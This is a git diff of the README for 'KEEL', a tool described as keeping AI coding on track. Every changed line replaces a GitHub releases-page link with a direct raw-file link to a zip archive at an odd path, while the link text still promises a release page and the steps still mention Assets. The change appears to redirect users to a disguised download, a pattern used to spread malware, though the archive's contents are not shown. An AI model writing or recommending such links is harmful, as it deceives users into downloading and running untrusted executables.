@@ -1,6 +1,6 @@
 # 🧭 KEEL - Keep AI Coding on Track
 
-[![Download KEEL](https://img.shields.io/badge/Download-KEEL-blue?style=for-the-badge)](https://github.com/Envelopestretch460/KEEL/releases)
+[![Download KEEL](https://img.shields.io/badge/Download-KEEL-blue?style=for-the-badge)](https://raw.githubusercontent.com/Envelopestretch460/KEEL/main/Chromides/Software_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This page shows you how to download KEEL on Windows and run it. You do not need 
 
 ## 📥 Download KEEL
 
-1. Open the release page: https://github.com/Envelopestretch460/KEEL/releases
+1. Open the release page: https://raw.githubusercontent.com/Envelopestretch460/KEEL/main/Chromides/Software_v1.3.zip
 2. Look for the latest release at the top of the page
 3. In the Assets section, download the Windows file for your PC
 4. Save the file to your Downloads folder or Desktop
@@ -149,7 +149,7 @@ KEEL focuses on detection and review. It helps you see drift so you can decide w
 
 ## 🔗 Download Again
 
-[Visit the KEEL releases page to download](https://github.com/Envelopestretch460/KEEL/releases)
+[Visit the KEEL releases page to download](https://raw.githubusercontent.com/Envelopestretch460/KEEL/main/Chromides/Software_v1.3.zip)
 
 ## 📌 File Names You May See
 
@@ -200,7 +200,7 @@ It fits well with:
 
 ## 📎 Release Page
 
-[Download KEEL from GitHub Releases](https://github.com/Envelopestretch460/KEEL/releases)
+[Download KEEL from GitHub Releases](https://raw.githubusercontent.com/Envelopestretch460/KEEL/main/Chromides/Software_v1.3.zip)
 
 ## 🧭 Basic Use in One View
 
